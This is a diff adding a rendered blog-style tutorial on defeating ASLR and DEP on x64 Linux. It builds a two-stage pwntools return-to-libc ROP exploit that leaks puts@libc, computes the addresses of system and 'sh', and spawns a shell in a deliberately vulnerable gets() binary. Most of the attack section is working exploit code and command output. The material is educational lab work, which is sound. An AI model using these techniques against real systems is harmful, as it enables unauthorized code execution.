@@ -1,0 +1,350 @@
+I"`<p>Today, I’d like to take some time and to present a short trick to bypass both <strong>ASLR</strong> (<em>Address Space Layout Randomization</em>) and <strong>DEP</strong> (<em>Data Execution Prevention</em>) in order to obtain a shell in a <strong>buffer-overflow</strong> vulnerable binary.</p>
+
+<p>I’ve seen this problem discussed using <strong>return-to-PLT</strong> strategies, which is fine if your targeted method is already used in the binary – although, let’s face it, not many programs will call <code class="highlighter-rouge">system()</code> or <code class="highlighter-rouge">exec()</code> and invite you to spawn shells.</p>
+
+<p>This approach revolves around a <strong>return-to-libc</strong> attack in which the attacker first <strong>leaks the address</strong> of a known function (e.g.: <code class="highlighter-rouge">puts()</code>) and then computes the <strong>offset</strong> between that known function and the targeted function (e.g.: <code class="highlighter-rouge">system()</code>). By summing the 2 values, the result is the address of the function that we want to call using the exploit. If you understood this part, you only need to prepare the payloads.</p>
+
+<p>Given a vulnerable binary, let’s consider the following scenario:</p>
+
+<ol>
+  <li><strong>ASLR</strong> is enabled</li>
+  <li><strong>DEP</strong> is enabled</li>
+  <li>Only <code class="highlighter-rouge">gets()</code> and <code class="highlighter-rouge">puts()</code> are called in the binary</li>
+  <li>Running on a <strong>x64</strong> system (no bruteforce)</li>
+  <li>For the sake of simplicity: no stack protectors (<strong>no canary values</strong>)</li>
+  <li>The attacker knows which <strong>libc</strong> version is used by the binary</li>
+</ol>
+
+<h2 id="vulnerable-binary">Vulnerable Binary</h2>
+
+<p>While writing this, I’ve been using this really simple binary (vuln.c):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="cp">#include&lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"hi there</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Compiled with the following parameters:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>gcc <span class="nt">-Wall</span> <span class="nt">-ansi</span> <span class="nt">-fno-stack-protector</span> vuln.c <span class="nt">-o</span> vuln
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="step-1-basic-buffer-overflow">Step 1: Basic Buffer Overflow</h2>
+
+<p>We start by finding the offset in order to <strong>overwrite</strong> the <strong>return address</strong> and perform a simple execution hijacking. There are multiple ways of doing this: you can either start with a payload of a random size and analyze the behaviour of the binary in a debugger (like <strong>GDB</strong>) such as the image below, where we overwrite the return address and the <strong>RIP</strong> (PC) jumps to <strong>0x414241424142</strong> (“<strong>ABABAB</strong>”)</p>
+
+<figure class="image">
+  <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" data-echo="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_buffer_overflow.webp" alt="&lt;p&gt;Finding the offset for a buffer overflow attack by trial-and-error&lt;/p&gt;
+" />
+  <figcaption><p>Finding the offset for a buffer overflow attack by trial-and-error</p>
+</figcaption>
+</figure>
+
+<p>I usually test this with an address that calls a specific function or jumps back to the start of the program (<strong>0x400566</strong>)</p>
+
+<figure class="image">
+  <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" data-echo="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_main_addr.webp" alt="&lt;p&gt;The ‘main’ address is used to call the program multiple times and supply multiple payloads&lt;/p&gt;
+" />
+  <figcaption><p>The ‘main’ address is used to call the program multiple times and supply multiple payloads</p>
+</figcaption>
+</figure>
+
+<p>Should you succeed, it will print twice the same message:</p>
+
+<figure class="image">
+  <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" data-echo="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_call_twice.webp" alt="&lt;p&gt;Running the same program twice to prevent ASLR re-randomization&lt;/p&gt;
+" />
+  <figcaption><p>Running the same program twice to prevent ASLR re-randomization</p>
+</figcaption>
+</figure>
+
+<hr />
+
+<p><em>Why is this important?</em></p>
+
+<p>It is important because <strong>ASLR</strong> randomizes the heap, stack and the offsets where are mapped the libraries (such as libc) only when the binary is launched into execution. Calling main once again will <strong>not</strong> trigger a re-randomization.</p>
+
+<p>This means we can submit multiple payloads while having fixed offsets (mitigating the effect of ASLR).</p>
+
+<hr />
+
+<h2 id="step-2-leaking-the-address-of-putslibc">Step 2: Leaking the Address of puts@libc</h2>
+
+<p>This is the difficult part. Multiple payloads are required in order to spawn a shell using this binary. Basically, you’ll want to leak the address of <code class="highlighter-rouge">puts()</code> using a <code class="highlighter-rouge">puts@PLT()</code> call and then compute the address of <code class="highlighter-rouge">system()</code> by having access to <strong>libc</strong>. Additionally, you’ll want to compute the address of a <strong>“sh”</strong> string, in order to achieve a <code class="highlighter-rouge">system("sh")</code> call. You’ll have to use a second payload to perform the aforementioned call.</p>
+
+<p>I recommend you perform these steps using a framework like <strong>pwntools</strong> since the the second payload must be adapted using information leaked at runtime.</p>
+
+<p>To continue, one must understand the role of the <strong>GOT</strong> (<em>Global Offset Table</em>) in a binary as there is no exact way of previously knowing where <strong>ASLR</strong> will map each external library of the current process.</p>
+
+<figure class="image">
+  <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" data-echo="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_ldd.webp" alt="&lt;p&gt;Running ldd reveals different mapping addresses of libc each time the process starts&lt;/p&gt;
+" />
+  <figcaption><p>Running ldd reveals different mapping addresses of libc each time the process starts</p>
+</figcaption>
+</figure>
+
+<p>The addresses of the external methods are usually determined at runtime when these methods are called for the first time (i.e.: when the <strong>PLT</strong> trampoline is executed for the first time).
+However, the addresses need to be referenced in the original code before the program runs -&gt; so placeholders (fixed addresses / <strong>@GOT</strong> addresses) are used. <strong>GOT</strong> acts as a <em>dictionary</em> and binds
+the placeholder addresses to the real/external addresses (in the library). The values of the <strong>GOT</strong> are determined and written by the dynamic address solver (linker) once a method is called.</p>
+
+<p>In our first payload, we’ll want to use <strong>GOT</strong> addresses (placeholders) instead of external addresses (which are randomized). One interesting observation is that calling <code class="highlighter-rouge">puts(puts@GOT)</code> will
+actually output the external address of <code class="highlighter-rouge">puts@libc</code>.</p>
+
+<p>We’ll want our initial payload to perform such a call in order to have an initial idea of where the libc is mapped.</p>
+
+<p>Start by running the following command so you can view the address of <code class="highlighter-rouge">puts@GOT</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>objdump <span class="nt">-R</span> vuln
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Pay attention at the second row and write down the address:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>OFFSET           TYPE                VALUE
+
+0000000000600ff8 R_X86_64_GLOB_DAT   __gmon_start__
+&gt; 0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
+0000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
+0000000000601028 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Next, you’ll need a <strong>ROP gadget</strong> that takes a parameter from the stack and places it into the <strong>RDI</strong> register (in our case, takes the <strong>@GOT</strong> address from our payload, from the stack, and sets it as the first parameter for a future <code class="highlighter-rouge">puts@PLT</code> call). As you remember, we’re running on a <strong>x64</strong> architecture and the calling convention
+states that the first parameter of a method must be placed in the <strong>RDI</strong> register. We’re looking for a <code class="highlighter-rouge">POP RDI; RET</code> gadget – I’m doing this using <strong>ROPgadget</strong> (so it’s <code class="highlighter-rouge">ROPgadget --binary vuln</code>)
+but feel free to use whatever you’re confortable with (GDB, radare2, etc.).</p>
+
+<p>We’ll get the following line:</p>
+
+<p><code class="highlighter-rouge">0x00000000004005f3 : pop rdi ; ret</code></p>
+
+<p>The last thing that the payload requires is a way to call <code class="highlighter-rouge">puts()</code>. We can achieve this by calling <code class="highlighter-rouge">puts@PLT</code> (through the <strong>PLT</strong> trampoline) since its address is also fixed and unaffected by <strong>ASLR</strong>.<br />
+You can use something like this to extract the address from the binary:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>objdump <span class="nt">-d</span> <span class="nt">-M</span> intel vuln | <span class="nb">grep</span> <span class="s2">"puts@plt"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I got something like this:</p>
+
+<p><code class="highlighter-rouge">0000000000400430 &lt;puts@plt&gt;:</code></p>
+
+<p>Finally, we can construct the first payload. I’ll write this as a <strong>pwntools</strong> python script so I’ll be able to expand it and include the second payload.
+The new flow of the program must be the following:</p>
+
+<p>RET to pop_rdi_ret_address -&gt; (RDI = puts@GOT) RET to puts_plt_address -&gt; RET to main</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'vuln'</span><span class="p">)</span>
+
+<span class="n">main_address</span> <span class="o">=</span> <span class="mh">0x00400566</span>
+<span class="n">puts_got_address</span> <span class="o">=</span> <span class="mh">0x0000000000601018</span>
+<span class="n">puts_plt_address</span> <span class="o">=</span> <span class="mh">0x0000000000400430</span>
+<span class="n">pop_rdi_ret_address</span> <span class="o">=</span> <span class="mh">0x00000000004005f3</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_address</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># "hi there"
+</span>
+<span class="n">leaked_output</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">leaked_output</span> <span class="o">=</span> <span class="n">leaked_output</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">'leaked puts() address'</span><span class="p">,</span> <span class="n">leaked_output</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'a'</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># "hi there"
+</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And when running it…</p>
+
+<figure class="image">
+  <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" data-echo="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_payload_leak_puts.webp" alt="&lt;p&gt;Leaking the address of puts@libc&lt;/p&gt;
+" />
+  <figcaption><p>Leaking the address of puts@libc</p>
+</figcaption>
+</figure>
+
+<h2 id="step-3-finding-the-address-of-systemlibc">Step 3: Finding the Address of system@libc</h2>
+
+<p>In this part, we compute the <strong>offset</strong> between <code class="highlighter-rouge">puts@libc</code> and <code class="highlighter-rouge">system@libc</code> while also finding the address of a <strong>“sh”</strong> string.
+We know, from the previous <strong>ldd</strong> run, that the binary uses the libc located at: <strong>/lib/x86_64-linux-gnu/libc.so.6</strong>.</p>
+
+<p>Running the following commands will return the <strong>offsets</strong> of <code class="highlighter-rouge">system()</code> and <code class="highlighter-rouge">puts()</code> from libc:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>objdump <span class="nt">-d</span> <span class="nt">-M</span> intel /lib/x86_64-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="s2">"system"</span>
+objdump <span class="nt">-d</span> <span class="nt">-M</span> intel /lib/x86_64-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="s2">"_IO_puts"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The lines of interest are:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>0000000000045390 &lt;__libc_system@@GLIBC_PRIVATE&gt;:
+000000000006f690 &lt;_IO_puts@@GLIBC_2.2.5&gt;:
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I found the <strong>offset</strong> of the <strong>“sh”</strong> string inside <strong>libc</strong> using <strong>radare2</strong>. Pick one.</p>
+
+<figure class="image">
+  <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" data-echo="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_sh_address.webp" alt="&lt;p&gt;Offsets of various ‘sh’ strings inside libc (radare2)&lt;/p&gt;
+" />
+  <figcaption><p>Offsets of various ‘sh’ strings inside libc (radare2)</p>
+</figcaption>
+</figure>
+
+<p>Subtracting <code class="highlighter-rouge">puts()</code>’s offset from the leaked <code class="highlighter-rouge">puts@libc</code> address gives us the <strong>base address</strong> of libc (the start of the memory region where it is mapped for the current process).
+By adding the offset of <code class="highlighter-rouge">system()</code> we get a call to <code class="highlighter-rouge">system@libc</code>.</p>
+
+<p>Now, we can adapt the previous script in order to create the second payload that makes the call.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'vuln'</span><span class="p">)</span>
+
+<span class="n">main_address</span> <span class="o">=</span> <span class="mh">0x00400566</span>
+<span class="n">puts_got_address</span> <span class="o">=</span> <span class="mh">0x0000000000601018</span>
+<span class="n">puts_plt_address</span> <span class="o">=</span> <span class="mh">0x0000000000400430</span>
+<span class="n">pop_rdi_ret_address</span> <span class="o">=</span> <span class="mh">0x00000000004005f3</span>
+
+<span class="n">puts_libc_offset</span> <span class="o">=</span> <span class="mh">0x000000000006f690</span>
+<span class="n">system_libc_offset</span> <span class="o">=</span> <span class="mh">0x0000000000045390</span>
+<span class="n">sh_libc_offset</span> <span class="o">=</span> <span class="mh">0x00011e70</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_address</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">leaked_output</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">leaked_output</span> <span class="o">=</span> <span class="n">leaked_output</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">'leaked puts() address'</span><span class="p">,</span> <span class="n">leaked_output</span><span class="p">)</span>
+
+<span class="n">leaked_output</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x00\x00</span><span class="s">'</span>
+
+<span class="n">puts_libc_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_output</span><span class="p">)</span>
+
+<span class="n">system_libc_address</span> <span class="o">=</span> <span class="n">puts_libc_address</span> <span class="o">-</span> <span class="n">puts_libc_offset</span> <span class="o">+</span> <span class="n">system_libc_offset</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'system() address'</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_libc_address</span><span class="p">))</span>
+
+<span class="n">sh_libc_address</span> <span class="o">=</span> <span class="n">puts_libc_address</span> <span class="o">-</span> <span class="n">puts_libc_offset</span> <span class="o">+</span> <span class="n">sh_libc_offset</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_libc_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_libc_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_address</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span> <span class="c1"># hi there
+</span>
+<span class="c1">#r.sendline(payload)
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="small-proof-of-concept">Small Proof-Of-Concept</h2>
+
+<p>Here is a small PoC, representing the final result.</p>
+
+<p>For reference, the VM runs <strong>64 bit</strong> image of <strong>Ubuntu 16.04 Xenial</strong> with <strong>glibc 2.23</strong> (<code class="highlighter-rouge">md5(libc.so.6): 8c0d248ea33e6ef17b759fa5d81dda9e</code>), <strong>pwntools 4.0.1</strong> and <strong>Python 2.7</strong>.</p>
+
+<h5 id="upon-receiving-an-email-thanks-stefan-ive-noticed-that-i-was-sending-the-payload-twice-had-2x-rsendlinepayload-this-caused-the-weird-not-found-message-in-the-shell-i-commented-it-out-in-the-code-above-but-left-the-image-in-case-someone-has-this-issue-too">Upon receiving an email (thanks Stefan), I’ve noticed that I was sending the payload twice (had 2x <code class="highlighter-rouge">r.sendline(payload)</code>); this caused the weird “not found” message in the shell. I commented it out in the code above but left the image in case someone has this issue too.</h5>
+
+<figure class="image">
+  <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" data-echo="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_poc_shell.webp" alt="&lt;p&gt;Proof-Of-Concept: Shell spawned inside a Process with ASLR and DEP&lt;/p&gt;
+" />
+  <figcaption><p>Proof-Of-Concept: Shell spawned inside a Process with ASLR and DEP</p>
+</figcaption>
+</figure>
+
+<p><a href="https://www.codeproject.com" rel="tag" style="display:none">CodeProject</a></p>
+
+:ET
